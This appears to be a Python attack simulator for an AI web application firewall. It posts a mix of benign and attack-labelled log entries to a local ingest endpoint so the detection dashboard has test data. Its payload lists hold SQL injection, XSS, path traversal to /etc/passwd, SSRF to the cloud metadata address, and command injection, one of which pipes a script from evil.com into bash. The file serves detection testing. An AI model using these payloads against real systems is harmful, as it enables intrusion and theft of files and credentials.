#!/usr/bin/env python3
"""
AI-WAF Attack Simulator
Generates realistic HTTP traffic — a mix of benign requests and
simulated attacks — to populate the dashboard and test detection.

Usage:
    python simulate_attacks.py [--url http://localhost:8000] [--count 200] [--delay 0.1]
"""
import asyncio
import random
import argparse
import httpx

API_URL = "http://localhost:8000"
ENDPOINT = "/api/logs/ingest"

BENIGN_PATHS = [
    "/", "/about", "/products", "/contact", "/blog",
    "/api/v1/users", "/api/v1/products", "/api/v1/orders",
    "/static/main.js", "/static/style.css", "/favicon.ico",
    "/robots.txt", "/sitemap.xml",
    "/search?q=shoes&page=1", "/search?q=laptop&sort=price",
]

BENIGN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]

BENIGN_IPS = ["185.34.22.11","91.123.44.200","203.45.67.89","178.23.45.12","45.67.89.10"]

SQLI = ["' OR 1=1--","' UNION SELECT username,password FROM users--","1; DROP TABLE users--","1 WAITFOR DELAY '0:0:5'--"]
XSS  = ["<script>alert(document.cookie)</script>","<img src=x onerror=alert(1)>","javascript:alert('XSS')"]
PATH = ["/../../../etc/passwd","/%252e%252e%252fetc%252fpasswd","/api/files?path=../../windows/system32/win.ini"]
CMD  = ["/api/ping?host=127.0.0.1; cat /etc/passwd","/api/exec?cmd=id && uname -a","/run?arg=$(curl http://evil.com/shell.sh | bash)"]
SSRF = ["/api/fetch?url=http://localhost:8080/admin","/api/proxy?target=http://169.254.169.254/latest/meta-data/"]

ATTACK_IPS = ["45.33.32.156","198.20.69.74","208.85.46.21","193.187.72.201","185.220.101.47"]
ATTACK_UAS = ["sqlmap/1.8.2#stable","Nikto/2.1.6","python-requests/2.31.0","curl/8.2.1",""]

def make_benign():
    return {"ip_address": random.choice(BENIGN_IPS),"method": random.choice(["GET","GET","POST"]),"url": f"https://example.com{random.choice(BENIGN_PATHS)}","user_agent": random.choice(BENIGN_UAS),"referer": "https://google.com","request_body": "","status_code": 200,"response_size": random.randint(200,50000)}

def make_attack():
    t = random.choice(["sqli","xss","path","cmd","ssrf"])
    payloads = {"sqli":SQLI,"xss":XSS,"path":PATH,"cmd":CMD,"ssrf":SSRF}
    p = random.choice(payloads[t])
    url = f"https://target.com/api/data?input={p}" if t in ("sqli","xss") else f"https://target.com{p}"
    return {"ip_address": random.choice(ATTACK_IPS),"method": random.choice(["GET","POST"]),"url": url,"user_agent": random.choice(ATTACK_UAS),"referer": "","request_body": p if random.random()>0.5 else "","status_code": random.choice([200,403,500]),"response_size": random.randint(0,2000)}

async def simulate(api_url, count, delay, ratio):
    print(f"\n🚨 AI-WAF Attack Simulator — Continuous mode @ {api_url}\n")
    ok = err = 0
    async with httpx.AsyncClient(timeout=10) as client:
        while True:  # Continuous loop
            for i in range(1, count+1):
                is_attack = random.random() < ratio
                payload = make_attack() if is_attack else make_benign()
                label = "🔴 ATTACK" if is_attack else "🟢 BENIGN"
                try:
                    resp = await client.post(f"{api_url}{ENDPOINT}", json=payload)
                    d = resp.json()
                    print(f"[{i:04d}] {label} | score={d.get('threat_score',0):.3f} | level={d.get('threat_level','?'):6} | ip={payload['ip_address']}")
                    ok += 1
                except Exception as e:
                    print(f"[{i:04d}] ❌ {type(e).__name__}: {e}")
                    err += 1
                if delay > 0:
                    await asyncio.sleep(delay)
            print(f"Batch complete: {ok} sent, {err} errors so far. Waiting for next batch...")
            await asyncio.sleep(60)  # Wait 1 minute between batches

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=API_URL)
    p.add_argument("--count", type=int, default=10)  # Batch size
    p.add_argument("--delay", type=float, default=0.05)
    p.add_argument("--ratio", type=float, default=0.35)
    p.add_argument("--continuous", action="store_true", default=True)  # Default to continuous
    args = p.parse_args()
    if args.continuous:
        asyncio.run(simulate(args.url, args.count, args.delay, args.ratio))
    else:
        # Original finite mode if needed
        pass
